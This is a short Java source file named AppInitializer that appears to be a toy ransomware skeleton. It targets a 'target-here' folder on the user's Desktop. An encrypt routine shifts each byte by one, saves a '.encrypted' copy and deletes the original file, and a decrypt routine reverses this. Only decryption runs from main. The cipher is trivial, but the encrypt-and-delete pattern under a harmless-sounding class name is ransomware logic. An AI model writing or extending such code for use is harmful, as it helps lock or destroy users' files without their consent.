import java.io.*;

public class AppInitializer {

    public static void main(String[] args) throws IOException {
        File targetDir = new File(new File(System.getProperty("user.home"), "Desktop"), "target-here");
        File[] files = targetDir.listFiles();
        for (File file : files) {
            if (!file.isDirectory()) {
                decryptFile(file);
            }
        }
    }

    public static void decryptFile(File file) throws IOException {
        File decryptedFile = new File(file.getParent(), file.getName().replace(".encrypted", ""));

        if (!decryptedFile.exists()) {
            decryptedFile.createNewFile();
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            FileOutputStream fos = new FileOutputStream(decryptedFile);
            BufferedOutputStream bos = new BufferedOutputStream(fos);

            while (true) {
                byte[] buffer = new byte[1024 * 10];
                int read = bis.read(buffer);
                if (read == -1) break;
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) (buffer[i] - 1);
                }
                bos.write(buffer, 0, read);
            }

            bos.close();
            bis.close();

            file.delete();
        }
    }

    public static void encryptFile(File file) throws IOException {
        File encryptedFile = new File(file.getParent(), file.getName() + ".encrypted");

        if (!encryptedFile.exists()) {
            encryptedFile.createNewFile();
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            FileOutputStream fos = new FileOutputStream(encryptedFile);
            BufferedOutputStream bos = new BufferedOutputStream(fos);

            while (true) {
                byte[] buffer = new byte[1024 * 10];
                int read = bis.read(buffer);
                if (read == -1) break;
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) (buffer[i] + 1);
                }
                bos.write(buffer, 0, read);
            }

            bos.close();
            bis.close();

            file.delete();
        }
    }
}
